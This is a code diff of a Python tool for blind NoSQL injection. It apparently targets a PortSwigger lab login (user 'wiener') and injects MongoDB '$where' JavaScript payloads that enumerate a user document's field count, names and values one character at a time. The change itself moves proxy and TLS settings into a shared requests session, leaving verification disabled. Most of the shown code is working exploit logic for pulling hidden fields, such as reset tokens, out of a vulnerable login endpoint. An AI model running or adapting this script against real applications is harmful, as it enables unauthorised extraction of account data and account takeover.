@@ -10,26 +10,30 @@ def def_handler(sig, frame):
 
 signal.signal(signal.SIGINT, def_handler)
 
-def make_request(url, payload, proxy_url=None):
-    headers = {
+session = None
+
+def init_session(proxy_url=None):
+    global session
+    session = requests.Session()
+    
+    session.headers.update({
         'Content-Type': 'application/json',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    }
+    })
     
-    proxies = None
     if proxy_url:
-        proxies = {
+        session.proxies = {
             'http': proxy_url,
             'https': proxy_url
         }
     
+    session.verify = False
+
+def make_request(url, payload):
     try:
-        response = requests.post(
+        response = session.post(
             url,
             json=payload,
-            headers=headers,
-            proxies=proxies,
-            verify=False,
             timeout=300,
             allow_redirects=False
         )
@@ -45,7 +49,7 @@ def escape_regex_character(character):
         return '\\\\' + character
     return character
 
-def get_field_count(url, field_count, proxy_url=None):
+def get_field_count(url, field_count):
     payload = {
         "username": "wiener",
         "password": {
@@ -53,9 +57,9 @@ def get_field_count(url, field_count, proxy_url=None):
         },
         "$where": f"function(){{ if(Object.keys(this).length=={field_count}) return 1; else return 0; }}"
     }
-    return make_request(url, payload, proxy_url), payload
+    return make_request(url, payload), payload
 
-def get_field_length(url, field_index, length, proxy_url=None):
+def get_field_length(url, field_index, length):
     payload = {
         "username": "wiener",
         "password": {
@@ -63,9 +67,9 @@ def get_field_length(url, field_index, length, proxy_url=None):
         },
         "$where": f"function(){{ if(Object.keys(this)[{field_index}].length=={length}) return 1; else return 0; }}"
     }
-    return make_request(url, payload, proxy_url), payload
+    return make_request(url, payload), payload
 
-def get_field_value_length(url, field_name, length, proxy_url=None):
+def get_field_value_length(url, field_name, length):
     payload = {
         "username": "wiener",
         "password": {
@@ -73,9 +77,9 @@ def get_field_value_length(url, field_name, length, proxy_url=None):
         },
         "$where": f"function(){{ if(this.{field_name}.valueOf().toString().length == {length}) return 1; else return 0; }}"
     }
-    return make_request(url, payload, proxy_url), payload
+    return make_request(url, payload), payload
 
-def enumerate_field_lengths(url, total_fields, proxy_url=None):
+def enumerate_field_lengths(url, total_fields):
     field_lengths_list = []
     print()
     progress_bar = log.progress("Enumerating field lengths")
@@ -85,7 +89,7 @@ def enumerate_field_lengths(url, total_fields, proxy_url=None):
         length_found = False
         
         while not length_found:
-            result, payload = get_field_length(url, current_field_index, current_length, proxy_url)
+            result, payload = get_field_length(url, current_field_index, current_length)
             progress_bar.status(payload["$where"])
             if result:
                 field_lengths_list.append(current_length)
@@ -97,7 +101,7 @@ def enumerate_field_lengths(url, total_fields, proxy_url=None):
     progress_bar.success("Completed")
     return field_lengths_list
 
-def enumerate_field_value_lengths(url, field_names_list, field_indexes, proxy_url=None):
+def enumerate_field_value_lengths(url, field_names_list, field_indexes):
     field_value_lengths = {}
     print()
     progress_bar = log.progress("Enumerating field value lengths")
@@ -113,7 +117,7 @@ def enumerate_field_value_lengths(url, field_names_list, field_indexes, proxy_ur
         value_length_found = False
         
         while not value_length_found:
-            result, payload = get_field_value_length(url, current_field_name, current_value_length, proxy_url)
+            result, payload = get_field_value_length(url, current_field_name, current_value_length)
             progress_bar.status(payload["$where"])
             
             if result:
@@ -126,7 +130,7 @@ def enumerate_field_value_lengths(url, field_names_list, field_indexes, proxy_ur
     progress_bar.success("Completed")
     return field_value_lengths
 
-def get_field_char(url, field_index, position, character, proxy_url=None):
+def get_field_char(url, field_index, position, character):
     escaped_character = escape_regex_character(character)
     
     payload = {
@@ -136,9 +140,9 @@ def get_field_char(url, field_index, position, character, proxy_url=None):
         },
         "$where": f"function(){{ if(Object.keys(this)[{field_index}].match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
     }
-    return make_request(url, payload, proxy_url), payload
+    return make_request(url, payload), payload
 
-def get_field_value_char(url, field_name, position, character, proxy_url=None):
+def get_field_value_char(url, field_name, position, character):
     escaped_character = escape_regex_character(character)
     
     payload = {
@@ -148,9 +152,9 @@ def get_field_value_char(url, field_name, position, character, proxy_url=None):
         },
         "$where": f"function(){{ if(this.{field_name}.valueOf().toString().match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
     }
-    return make_request(url, payload, proxy_url), payload
+    return make_request(url, payload), payload
 
-def enumerate_field_names(url, field_lengths_list, proxy_url=None):
+def enumerate_field_names(url, field_lengths_list):
     characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
     field_names_list = []
     print()
@@ -170,7 +174,7 @@ def enumerate_field_names(url, field_lengths_list, proxy_url=None):
             character_found = None
             
             for character in characters:
-                result, payload = get_field_char(url, current_field_index, current_position, character, proxy_url)
+                result, payload = get_field_char(url, current_field_index, current_position, character)
                 progress_bar.status(payload["$where"])
                 
                 if result:
@@ -190,7 +194,7 @@ def enumerate_field_names(url, field_lengths_list, proxy_url=None):
     progress_bar.success("Completed")
     return field_names_list
 
-def enumerate_field_values(url, field_names_list, field_value_lengths, field_indexes, proxy_url=None):
+def enumerate_field_values(url, field_names_list, field_value_lengths, field_indexes):
     characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
     field_values = {}
     print()
@@ -217,7 +221,7 @@ def enumerate_field_values(url, field_names_list, field_value_lengths, field_ind
             character_found = None
             
             for character in characters:
-                result, payload = get_field_value_char(url, current_field_name, current_position, character, proxy_url)
+                result, payload = get_field_value_char(url, current_field_name, current_position, character)
                 progress_bar.status(payload["$where"])
                 
                 if result:
@@ -238,6 +242,8 @@ def enumerate_field_values(url, field_names_list, field_value_lengths, field_ind
     return field_values
 
 def execute_nosql_enumeration(url, proxy_url=None, output_file='fields.txt'):
+    init_session(proxy_url)
+    
     if proxy_url:
         log.info(f"Using proxy: {proxy_url}")
     
@@ -247,7 +253,7 @@ def execute_nosql_enumeration(url, proxy_url=None, output_file='fields.txt'):
     count = 0
     
     while total_fields_found is None:
-        result, payload = get_field_count(url, count, proxy_url)
+        result, payload = get_field_count(url, count)
         progress_bar.status(payload["$where"])
         
         if result:
@@ -258,8 +264,8 @@ def execute_nosql_enumeration(url, proxy_url=None, output_file='fields.txt'):
     
     progress_bar.success(f"Completed")
     
-    field_lengths_list = enumerate_field_lengths(url, total_fields_found, proxy_url)
-    field_names_list = enumerate_field_names(url, field_lengths_list, proxy_url)
+    field_lengths_list = enumerate_field_lengths(url, total_fields_found)
+    field_names_list = enumerate_field_names(url, field_lengths_list)
     
     field_indexes = []
     while not field_indexes:
@@ -293,9 +299,9 @@ def execute_nosql_enumeration(url, proxy_url=None, output_file='fields.txt'):
             except ValueError:
                 log.warning("Invalid input. Please enter numbers separated by commas or 'all'.")
     
-    field_value_lengths = enumerate_field_value_lengths(url, field_names_list, field_indexes, proxy_url)
+    field_value_lengths = enumerate_field_value_lengths(url, field_names_list, field_indexes)
     
-    field_values = enumerate_field_values(url, field_names_list, field_value_lengths, field_indexes, proxy_url)
+    field_values = enumerate_field_values(url, field_names_list, field_value_lengths, field_indexes)
     
     has_valid_results = False
     for field_index in field_indexes:
